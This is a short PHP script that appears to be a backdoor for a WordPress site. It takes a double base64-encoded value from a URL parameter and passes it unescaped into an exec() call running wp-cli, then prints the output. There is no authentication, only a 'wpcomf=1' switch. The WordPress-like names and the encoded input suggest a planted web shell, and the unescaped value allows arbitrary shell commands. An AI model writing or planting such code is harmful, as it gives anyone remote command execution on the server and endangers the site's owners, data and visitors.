<?php
header("Content-type: text/html; charset=UTF-8\n\n"); 
$wpcomf = filter_input (INPUT_GET,'wpcomf', FILTER_VALIDATE_INT);
$wpval = $_GET['wpval'];
$wpval = base64_decode($wpval);
$wpval = base64_decode($wpval);
// echo $wpcomf;
// echo $wpval;
if ($wpcomf==1) {
  $cmd ="php ".$_SERVER['DOCUMENT_ROOT']. "/wp-cli.phar ".$wpval;
    exec ($cmd, $output, $return);
    echo var_dump($output);

}
 ?>